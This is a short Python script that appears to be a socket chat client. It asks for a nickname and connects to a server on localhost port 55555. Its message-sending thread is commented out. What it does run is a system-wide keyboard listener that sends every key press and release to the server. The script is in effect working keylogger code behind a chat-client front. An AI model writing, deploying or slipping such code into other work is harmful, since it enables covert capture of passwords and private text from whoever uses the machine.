import threading
import socket
from pynput.keyboard import Listener

n=input("choose a nickname:")


host = '127.0.0.1'  # localhost
port = 55555

c= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.connect((host, port))

def re():
    while True:
        try:
            m=c.recv(1024).decode('ascii')
            if m=='nick':
                c.send(n.encode('ascii'))
            else:
                print(m)
        except:
            print('error')
            c.close()
            break
def write():
    while True:
        m=f'{n}:{input("")}'
        c.send(m.encode('ascii'))
rt=threading.Thread(target=re)
rt.start()
wt=threading.Thread(target=write)
# wt.start()
def on_press(key):
    unmodified_key= Keyboard_listner.canonical(key)
    c.send(f'{find_Key_to_send(unmodified_key ,key)}_=P     '.encode('ascii'))
   
    
def find_Key_to_send(unmodified_key,key):
    if len(str(unmodified_key))>len(str(key)): 
        return unmodified_key
    else:
        return key

def on_release(key):
    unmodified_key= Keyboard_listner.canonical(key)
    c.send(f'{find_Key_to_send(unmodified_key ,key)}_=R     '.encode('ascii'))


Keyboard_listner=Listener(on_press=on_press,on_release=on_release)
Keyboard_listner.start()
    